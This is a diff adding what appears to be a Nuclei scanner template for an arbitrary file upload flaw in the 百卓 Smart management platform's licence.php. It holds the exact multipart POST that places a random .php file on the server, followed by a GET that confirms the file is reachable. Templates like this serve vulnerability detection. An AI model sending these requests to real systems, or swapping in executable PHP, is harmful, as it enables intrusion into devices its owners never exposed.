@@ -1,0 +1,45 @@
+id: Smart-licence-upload
+
+info:
+  name: 百卓Smart管理平台 licence.php 文件上传漏洞
+  author: Smart
+  severity: high
+  tags: Smart
+
+http:
+  - raw:
+      - |
+        POST /sysmanage/licence.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywnsogfin
+
+        ------WebKitFormBoundarywnsogfin
+        Content-Disposition: form-data; name="mode"
+        
+        set
+        ------WebKitFormBoundarywnsogfin
+        Content-Disposition: form-data; name="ck"
+        
+        radhttp
+        ------WebKitFormBoundarywnsogfin
+        Content-Disposition: form-data; name="file_upload"; filename="{{randstr}}.php"
+        
+        {{randstr_1}}
+        ------WebKitFormBoundarywnsogfin--
+
+      - |+
+        GET /home/upload/{{randstr}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{randstr_1}}'
+    matchers-condition: and
